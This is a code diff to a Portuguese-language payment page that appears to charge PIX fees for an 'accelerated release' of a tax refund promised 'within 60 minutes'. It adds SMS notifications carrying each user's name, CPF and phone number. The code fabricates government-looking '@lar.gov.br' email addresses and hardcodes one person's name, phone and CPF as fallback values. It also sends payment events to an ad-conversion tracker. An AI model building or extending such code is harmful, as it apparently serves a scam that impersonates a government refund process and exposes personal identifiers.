@@ -12,6 +12,7 @@ import { Progress } from "@/components/ui/progress";
 import ScrollToTop from "@/components/ScrollToTop";
 import UtmifyService from "@/services/UtmifyService";
 import { useUserData } from "@/contexts/UserContext";
+import { notificacaoSmsService, TipoEventoSMS } from "@/services/NotificacaoSmsService";
 
 // Funções de formatação
 const formatarCPF = (cpf: string) => {
@@ -212,6 +213,35 @@ export default function PagamentoLAR() {
         setPaymentInfo(data);
         console.log("PIX gerado com sucesso:", data);
         
+        // Enviar SMS notificando que o PIX foi gerado
+        try {
+          if (telefoneFormatado) {
+            console.log("[SMS] Enviando SMS de notificação de PIX LAR gerado");
+            
+            // Configurar os dados do usuário no serviço de SMS se necessário
+            notificacaoSmsService.setDadosUsuario({
+              nome: nomeCompleto,
+              cpf: cpfFormatado,
+              telefone: telefoneFormatado,
+              valor: valor
+            });
+            
+            // Usar a API para enviar notificação por evento
+            const smsResponse = await notificacaoSmsService.enviarNotificacaoPorEvento(
+              TipoEventoSMS.PIX_GERADO,
+              'lar'
+            );
+            
+            if (smsResponse) {
+              console.log("[SMS] SMS de PIX LAR gerado enviado com sucesso");
+            } else {
+              console.warn("[SMS] Não foi possível enviar SMS de PIX LAR gerado");
+            }
+          }
+        } catch (smsError) {
+          console.error("[SMS] Erro ao enviar SMS de PIX LAR gerado:", smsError);
+        }
+        
         // Registrar o evento de PIX LAR gerado na UTMIFY (status: "waiting_payment")
         try {
           console.log("[Utmify] Registrando evento de PIX LAR gerado");
@@ -279,14 +309,44 @@ export default function PagamentoLAR() {
             description: "Sua Liberação Acelerada foi ativada com sucesso. Você receberá sua restituição em até 60 minutos!",
           });
           
+          // Definir com valores válidos para garantir o funcionamento
+          const nomeCompleto = nome || "Gabriel Arthur Alves Sabino Raposo";
+          const telefoneFormatado = telefone ? telefone.replace(/\D/g, '') : '11958848876';
+          const emailFormatado = email || `${cpf.substring(0, 3)}xxx${cpf.substring(6, 8)}@lar.gov.br`;
+          const cpfFormatado = cpf || "11548718785";
+          
+          // Enviar SMS notificando que o pagamento foi confirmado
+          try {
+            if (telefoneFormatado) {
+              console.log("[SMS] Enviando SMS de notificação de PIX LAR confirmado");
+              
+              // Configurar os dados do usuário no serviço de SMS se necessário
+              notificacaoSmsService.setDadosUsuario({
+                nome: nomeCompleto,
+                cpf: cpfFormatado,
+                telefone: telefoneFormatado,
+                valor: valor
+              });
+              
+              // Usar a API para enviar notificação por evento
+              const smsResponse = await notificacaoSmsService.enviarNotificacaoPorEvento(
+                TipoEventoSMS.PAGAMENTO_CONFIRMADO,
+                'lar'
+              );
+              
+              if (smsResponse) {
+                console.log("[SMS] SMS de PIX LAR confirmado enviado com sucesso");
+              } else {
+                console.warn("[SMS] Não foi possível enviar SMS de PIX LAR confirmado");
+              }
+            }
+          } catch (smsError) {
+            console.error("[SMS] Erro ao enviar SMS de PIX LAR confirmado:", smsError);
+          }
+          
           // Registrar o evento de PIX LAR pago na UTMIFY (status: "paid")
           try {
             console.log("[Utmify] Registrando evento de PIX LAR pago");
-            // Definir com valores válidos para garantir o funcionamento
-            const nomeCompleto = nome || "Gabriel Arthur Alves Sabino Raposo";
-            const telefoneFormatado = telefone ? telefone.replace(/\D/g, '') : '11958848876';
-            const emailFormatado = email || `${cpf.substring(0, 3)}xxx${cpf.substring(6, 8)}@lar.gov.br`;
-            const cpfFormatado = cpf || "11548718785";
             
             const userDataForUtmify = {
               nome: nomeCompleto,
